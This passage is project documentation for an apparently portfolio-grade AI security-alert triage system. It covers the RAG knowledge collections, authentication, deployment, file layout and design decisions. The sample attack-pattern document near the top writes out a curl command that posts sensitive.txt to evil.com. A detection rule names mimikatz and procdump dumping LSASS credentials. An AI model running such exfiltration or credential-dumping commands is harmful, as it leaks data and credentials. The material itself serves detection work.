Category: data_exfiltration
MITRE Technique: T1041
Command: curl -X POST https://evil.com/exfil -d @sensitive.txt
Why Malicious: Encrypted channel bypasses DLP inspection
Indicators: Large uploads from internal user, After-hours upload, Upload to new service
Detection: medium
Sophistication: medium to high
```

**~40 attack pattern documents**

#### 5. `detection_rules` Collection
**Purpose:** SIEM correlation rules and detection logic.

**Document Structure:**
```
Rule Name: Credential Dumping via LSASS
MITRE Technique: T1003.001
Logic: process_name IN ('mimikatz', 'procdump') AND target_process = 'lsass.exe'
Severity: critical
False Positive Rate: low
Recommended Action: Immediate host isolation
```

**~30 detection rules**

#### 6. `detection_signatures` Collection
**Purpose:** Behavioral detection signatures.

**Document Structure:**
```
Signature Category: command_injection_signatures
Behavioral Indicator: unexpected_process_spawn
Indicator: web app spawning shell commands
Threshold: N/A
Type: behavioral
```

**~25 behavioral signatures**

#### 7. `company_infrastructure` Collection
**Purpose:** Asset context and user information.

**Document Structure:**
```
Asset: DC-PRIMARY
Type: Domain Controller
Criticality: critical
Department: IT
Services: Active Directory, DNS, LDAP
Backup: DC-SECONDARY
Notes: Any compromise = full network compromise
```

**~20 asset definitions**

---

## Security Features

### Authentication
- **Session-based authentication** with secure cookies
- **Timing-safe credential comparison** (prevents timing attacks)
- **Configurable via environment variables:**
  - `AUTH_USERNAME` (default: analyst)
  - `AUTH_PASSWORD` (default: watchdog123)
  - `SESSION_SECRET` (32-char hex string)

### API Security
- **Ingest API key protection:** `X-Ingest-Key` header required
- **CORS configuration:** Wildcard for demo, restrict in production
- **Request size limiting:** 2MB max payload
- **Rate limiting:** Built into Claude API client

### Data Protection
- **PII masking** before AI analysis
- **Secrets redaction** in logs (API keys, tokens)
- **Secure cookie settings:** HttpOnly, Secure, SameSite=Lax

### Input Validation
- **Prompt injection detection** via InputGuard
- **Pydantic schema validation** for all inputs
- **SQL injection prevention** via parameterized queries

### Output Sanitization
- **XSS prevention** in AI responses
- **Markdown sanitization**
- **Code block filtering**

---

## Deployment

### Backend (Railway)

**Procfile:**
```
web: gunicorn -w 1 -k geventwebsocket.gunicorn.workers.GeventWebSocketWorker -b 0.0.0.0:$PORT app:app
```

**Environment Variables:**
```
ANTHROPIC_API_KEY=sk-ant-...
SUPABASE_URL=https://xxx.supabase.co
SUPABASE_KEY=eyJhbG...
SUPABASE_SERVICE_KEY=eyJhbG...
SESSION_SECRET=<32-char-hex>
AUTH_USERNAME=analyst
AUTH_PASSWORD=<secure-password>
INGEST_API_KEY=<secure-key>
```

### Frontend (Vercel)

**Environment Variables:**
```
VITE_API_URL=https://llm-watchdog-prototype-production.up.railway.app
```

**Build Command:** `npm run build`
**Output Directory:** `dist`

---

## Running Locally

### Backend
```bash
cd "AI Project"
pip install -r requirements.txt
python app.py
# Runs on http://localhost:5000
```

### Frontend
```bash
cd soc-dashboard
npm install
npm run dev
# Runs on http://localhost:5173
```

### Testing
```bash
# All tests
python tests/run_all_tests.py

# Quick tests (no API calls)
python tests/run_all_tests.py --quick

# API tests only
python tests/run_all_tests.py --api

# AI component tests
python tests/run_all_tests.py --ai
```

### Sending Test Alerts
```bash
# Set API key and run demo data script
set INGEST_API_KEY=<your-key>
python scripts/populate_demo_data.py http://localhost:5000
```

---

## File Structure

```
AI Project/
├── app.py                          # Main Flask application
├── requirements.txt                # Python dependencies
├── Procfile                        # Railway deployment config
├── railway.json                    # Railway settings
├── AGENTS.md                       # AI assistant instructions
│
├── backend/
│   ├── core/
│   │   ├── parser.py               # Alert parsing
│   │   ├── Severity.py             # Severity classification
│   │   ├── Queue_manager.py        # Queue management
│   │   └── mitre_mapping.py        # MITRE ATT&CK mapping
│   │
│   ├── ai/
│   │   ├── alert_analyzer_final.py # Main AI pipeline
│   │   ├── rag_system.py           # RAG knowledge retrieval
│   │   ├── security_guard.py       # Input/output security
│   │   ├── validation.py           # Pydantic schemas
│   │   ├── api_resilience.py       # Claude API client
│   │   ├── dynamic_budget_tracker.py # Cost management
│   │   ├── data_protection.py      # PII handling
│   │   ├── observability.py        # Monitoring components
│   │   └── osint_lookup.py         # OSINT enrichment
│   │
│   ├── storage/
│   │   ├── database.py             # Supabase client
│   │   └── s3_failover.py          # S3 backup
│   │
│   ├── monitoring/
│   │   ├── live_logger.py          # Real-time logging
│   │   ├── rag_api.py              # RAG dashboard API
│   │   ├── transparency_api.py     # Transparency API
│   │   └── system_monitor.py       # System metrics API
│   │
│   └── chromadb_data/              # Persisted vector DB
│
├── soc-dashboard/                  # React frontend
│   ├── src/
│   │   ├── pages/
│   │   │   ├── AnalystDashboard.jsx
│   │   │   ├── RAGDashboard.jsx
│   │   │   ├── TransparencyDashboard.jsx
│   │   │   ├── PerformanceDashboard.jsx
│   │   │   └── DebugDashboard.jsx
│   │   │
│   │   ├── components/
│   │   │   ├── Sidebar.jsx
│   │   │   └── LoginPage.jsx
│   │   │
│   │   └── utils/
│   │       └── api.js
│   │
│   ├── package.json
│   └── vite.config.js
│
├── scripts/
│   ├── populate_demo_data.py       # Demo alert generator
│   ├── seed_demo_alerts.py         # Alternative seeder
│   └── testing/                    # Test scripts
│
├── tests/
│   └── run_all_tests.py            # Test runner
│
└── docs/
    └── PROJECT_DOCUMENTATION.md    # This file
```

---

## Key Design Decisions

### 1. RAG over Fine-tuning
**Decision:** Use RAG with ChromaDB instead of fine-tuning Claude.
**Rationale:**
- Easier to update knowledge without retraining
- Lower cost (no training compute)
- More transparent (can show what knowledge was retrieved)
- Better for organization-specific context

### 2. Priority Queue System
**Decision:** Two-tier queue (priority/standard) instead of single queue.
**Rationale:**
- Critical alerts (ransomware, credential theft) need immediate attention
- Prevents low-severity alerts from blocking critical ones
- Matches real SOC workflows

### 3. Fast Mode for Dashboards
**Decision:** Generate RAG/transparency summaries from alert data instead of live ChromaDB queries.
**Rationale:**
- ChromaDB queries can take 40+ seconds
- Railway has memory constraints
- Dashboards need instant responses
- Actual AI analysis (which uses real RAG) already completed

### 4. Session-based Auth
**Decision:** Use Flask sessions instead of JWT tokens.
**Rationale:**
- Simpler implementation
- Automatic cookie management
- Good enough for demo/portfolio
- Can upgrade to JWT later if needed

### 5. In-memory Metrics
**Decision:** Store metrics in memory instead of database.
**Rationale:**
- Faster access for real-time dashboards
- Acceptable to reset on deploy (metrics rebuild quickly)
- Reduces database load
- Can add persistence layer later if needed

---

## Future Enhancements

1. **Persistent RAG Data Storage:** Store actual ChromaDB results when alert is analyzed
2. **JWT Authentication:** Upgrade from sessions to tokens for API access
3. **Webhook Notifications:** Alert on critical findings
4. **Multi-tenant Support:** Separate organizations/departments
5. **SOAR Integration:** Automated response actions
6. **Threat Intelligence Feeds:** Real-time IOC updates
7. **Custom RAG Collections:** User-uploadable knowledge bases
8. **Analyst Feedback Loop:** Train on analyst corrections

---

*Last Updated: January 28, 2026*
*Version: 1.0.0*
